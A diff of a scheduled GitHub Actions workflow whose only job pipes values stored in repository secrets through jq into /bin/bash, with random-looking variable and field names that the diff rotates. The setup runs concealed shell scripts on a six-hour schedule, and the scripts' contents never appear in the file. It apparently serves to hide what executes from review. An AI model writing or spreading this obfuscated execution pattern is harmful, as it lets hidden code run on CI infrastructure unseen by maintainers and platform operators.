@@ -2,22 +2,24 @@ name: joemoonx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 2/6 * * *'
-jobs:  # 26571
+    - cron: '57 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: joemoonx
         env:
-          gpmmw6846: ${{ secrets.gpmmw6846 }}
+          g391: ${{ secrets.g391 }}
         run: |
-          echo $gpmmw6846 | jq -r .skr7393 | /bin/bash
-          echo $u1 | jq -r .wq59369 | /bin/bash
-          echo $bphkr449 | jq -r .z56218 | /bin/bash
-          echo $eipyb0 | jq -r .um9351 | /bin/bash
-          echo $dfm3572 | jq -r .jfiih7 | /bin/bash
-          echo $ujbp5742 | jq -r .qtnda4099 | /bin/bash
-          echo $wdys42 | jq -r .q75906 | /bin/bash
+          echo $g391 | jq -r .uap8813 | /bin/bash
+          echo $r317 | jq -r .hugro28822 | /bin/bash
+          echo $ngvq50 | jq -r .bwds8 | /bin/bash
+          echo $nnfua60 | jq -r .cdyn4 | /bin/bash
+          echo $na946 | jq -r .faly30 | /bin/bash
+          echo $zygh48691 | jq -r .tu9067 | /bin/bash
+          echo $fk84 | jq -r .yds7490 | /bin/bash
+          echo $dyshv4 | jq -r .yln4019 | /bin/bash
+          echo $vef7905 | jq -r .lbu7439 | /bin/bash
 
